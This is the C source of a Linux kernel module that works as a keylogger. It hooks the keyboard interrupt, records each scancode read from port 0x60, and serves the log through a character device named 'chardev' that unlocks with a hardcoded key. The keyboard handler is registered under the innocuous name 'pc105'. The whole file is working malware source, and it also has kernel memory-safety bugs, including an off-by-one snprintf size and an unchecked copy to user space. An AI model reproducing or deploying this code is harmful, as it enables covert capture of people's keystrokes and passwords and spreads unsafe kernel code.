#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>

// kbd irq
#include <linux/interrupt.h>
#include <asm/io.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>

int init_module(void);
void cleanup_module(void);

static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);

#define SUCCESS 0
#define DEVICE_NAME "chardev"
#define BUF_LEN 10000

static int Major;
//static int Device_Open = 0;

// Device part {
static bool is_dev_opened = false;
// static char msg[BUF_LEN];
// static char *buff_Ptr;
static bool deleted = true;
static bool is_openned_once = true;
static int keys_pressed = 0;
static int scancodes_was_read = 0;
static char * key = "very_secret_key";
// }

// Kbd part {
static char scancode[1];
static char stash[BUF_LEN];
// }

// reverse the given null-terminated string in place
void inplace_reverse(char * str)
{
	if (str)
	{
		char * end = str + strlen(str) - 1;

		// swap the values in the two given variables
		// XXX: fails when a and b refer to same memory location
#   define XOR_SWAP(a,b) do	  \
		{                         \
			a ^= b;                 \
			b ^= a;                 \
			a ^= b;                 \
		} while (0)

		// walk inwards from both ends of the string,
		// swapping until we get to the middle
		while (str < end)
		{
			XOR_SWAP(*str, *end);
			str++;
			end--;
		}
#   undef XOR_SWAP
	}
}

// implementation of strcmp
// FIXME: check the lengths for equality
bool str_eq(const char* str1, const char* str2)
{
	while ( (*(str1) != '\0') && (*(str2) != '\0'))
	{
		//printk(KERN_INFO "chars: %c %c\n", *str1, *str2);
		if (*(str1) != *(str2))
		{
			return false;
		}
		++str1;
		++str2;
	}
	return true;
}

bool str_starts_with(const char * what, const char * with)
{
	while ((*(what) != '\0') && (*(with) != '\0'))
	{
		if (*(what) != *(with))
		{
			return false;
		}
		++what;
		++with;
	}

	return true;
}


void delete_content(void)
{
	printk(KERN_INFO "Delete contents.\n");
	deleted = true;
}

static struct file_operations fops = {
	.read = device_read,
	.write = device_write,
	.open = device_open,
	.release = device_release
};

static irqreturn_t irq_handler(int irq, void * data)
{
	char * sc = (char *)data;
	sc[0] = inb(0x60);

	return IRQ_WAKE_THREAD;
}

static irqreturn_t irq_thread(int irq, void * data)
{
	char * sc = (char *)data;

	if (!(sc[0] & 0x80))
	{
		stash[keys_pressed] = 0x7f & sc[0];
		keys_pressed = (keys_pressed + 1) % BUF_LEN;
	}

	printk(KERN_ALERT "[KEYLOGGER] Scan Code1 %#x %s\n", sc[0] & 0x7f, sc[0] & 0x80 ? "Released" : "Pressed");

	return IRQ_HANDLED;
}

int init_module(void) {
	Major = register_chrdev(0, DEVICE_NAME, &fops);
	if (Major < 0)
	{
		printk(KERN_ALERT "Registering device failed with %d\n", Major);
		return Major;
	}
	printk(KERN_INFO "Major number - %d\n", Major);
	printk(KERN_INFO "'mknod /dev/%s c %d 0'.\n", DEVICE_NAME, Major);
	printk(KERN_INFO "Try to make 'cat file' and 'echo smth' to read and write\n");
	printk(KERN_INFO "Available commands:\n");
	printk(KERN_INFO "reverse, dir forward, dir backward\n");
	printk(KERN_INFO "use 'rm /dev/%s'.\n\n", DEVICE_NAME);
	// return SUCCESS;

	return request_threaded_irq(1, irq_handler, irq_thread, IRQF_SHARED, "pc105", &scancode);
}

void cleanup_module(void)
{
	// Disable keyboard irq handling
	printk(KERN_ALERT "[KEYLOGGER] Disabling kbd irq handling.\n");
	free_irq(1, &scancode);

	// Disable character device
	printk(KERN_ALERT "[KEYLOGGER] Disabling character device.\n");
	unregister_chrdev(Major, DEVICE_NAME);
}

static int device_open(struct inode *inode, struct file *file)
{
	printk(KERN_ALERT "[KEYLOGGER] Openning device.\n");

	if (is_dev_opened)
	{
		return -EBUSY;
	}

	// reset internal logic state
	is_dev_opened = true;
	scancodes_was_read = 0;

	try_module_get(THIS_MODULE);

	return SUCCESS;
}

static int device_release(struct inode *inode, struct file *file)
{
	printk(KERN_ALERT "[KEYLOGGER] Releasing device.\n");

	is_dev_opened = false;
	module_put(THIS_MODULE);
	return 0;
}

static ssize_t device_read(struct file *filp, char __user * buff, size_t len, loff_t * offset)
{
	int bytes = 0;
	const int output_buffer_size = 5;
	char buffer[output_buffer_size];
	int i;

	printk(KERN_ALERT "[KEYLOGGER] Reading device.\n");

	if (!is_openned_once)
	{
		return 0;
	}

	is_openned_once = false;

	if (scancodes_was_read == keys_pressed)
	{
		return 0;
	}

	while (bytes < keys_pressed)
	{
		snprintf(buffer, output_buffer_size + 1, "%#04x ", (unsigned int)(stash[bytes]));
		for (i = 0; i < output_buffer_size; ++i)
		{
			put_user(buffer[i], buff++);
		}
		++bytes;
		++scancodes_was_read;
		--len;
	}

	return bytes * output_buffer_size; // must be equal to number of the printed bytes
}

static ssize_t device_write(struct file *filp, const char __user * buff, size_t len, loff_t * offset)
{
	int i;
	char new_msg[BUF_LEN]; // FIXME: Causes 'the frame size of BUF_LEN bytes is larger than 1024 bytes'

	printk(KERN_INFO "Writing to device: [lenght=%d]", (int)(len - 1) );

	for (i = 0; i < len && i < BUF_LEN; i++)
	{
		get_user(new_msg[i], buff + i);
	}

	if (str_starts_with(new_msg, "open"))
	{
		if (str_eq(new_msg + 5, key))
		{
			is_openned_once = true;
		}
	}
	if (str_eq(new_msg, "wipe"))
	{
		keys_pressed = 0;
	}
	else
	{
		// do nothing
	}

	return i;
}
